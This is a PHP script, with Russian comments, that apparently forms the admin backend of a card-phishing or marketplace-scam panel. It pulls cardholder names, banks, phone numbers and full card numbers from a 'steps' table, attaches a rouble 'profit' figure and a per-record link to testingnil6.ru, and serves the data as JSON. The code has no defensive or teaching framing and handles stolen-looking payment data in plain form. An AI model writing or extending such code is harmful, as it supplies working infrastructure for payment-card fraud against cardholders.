<?php
header('Content-Type: application/json');
include 'cors.php'; // Включение CORS, если необходимо
require_once 'db.php'; // Подключение к базе данных

try {
    // Получение соединения с базой данных
    $pdo = getDbConnection();

    // Запрос к таблице steps
    $stmt = $pdo->prepare('SELECT id, cardholder, bankname AS bank, phone, cardnumber, id_product, status FROM steps WHERE status IN (1, 2)');
    $stmt->execute();
    $applications = $stmt->fetchAll(PDO::FETCH_ASSOC);

    $result = [];
    foreach ($applications as $app) {
        // Получение market_price и your_price из таблицы products
        $stmt = $pdo->prepare('SELECT market_price, your_price FROM products WHERE id = :id_product');
        $stmt->bindParam(':id_product', $app['id_product'], PDO::PARAM_INT);
        $stmt->execute();
        $product = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($product) {
            $profit = $product['market_price'] - $product['your_price'];
            $url = 'https://testingnil6.ru:81/?id=' . $app['id'];

            $result[] = [
                'id' => $app['id'],
                'cardholder' => $app['cardholder'],
                'bank' => $app['bank'],
                'phone' => $app['phone'],
                'cardnumber' => $app['cardnumber'],
                'profit' => $profit . ' руб.',
                'status' => $app['status'],
                'url' => $url
            ];
        }
    }

    echo json_encode(['success' => true, 'data' => $result]);

} catch (PDOException $e) {
    echo json_encode(['success' => false, 'error' => 'Database error: ' . $e->getMessage()]);
}
?>
